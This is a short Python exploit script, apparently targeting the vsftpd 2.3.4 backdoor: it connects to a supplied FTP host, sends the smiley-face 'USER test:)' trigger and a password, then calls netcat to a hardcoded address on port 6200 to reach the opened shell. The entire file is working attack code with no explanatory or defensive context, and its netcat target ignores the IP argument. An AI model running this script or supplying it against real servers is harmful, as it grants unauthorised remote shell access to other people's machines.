import socket
import os
import sys

def prRed(skk): print("\033[91m{}\033[00m" .format(skk))

if len(sys.argv) != 3:
    prRed("[-] How to use -> python 10.0.0.10 21")
else:
    ip = sys.argv[1]
    port = sys.argv[2]

    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.connect((ip,int(port)))
    banner = tcp.recv(1024)

    print("[+] Banner info")
    print(banner)

    print("[*] Attempt Backdoor")
    tcp.send("USER test:)\r\n")
    tcp.send("PASS test\r\n")

    print("[+] Connect to Target")
    os.system("nc -v 172.16.1.5 6200")
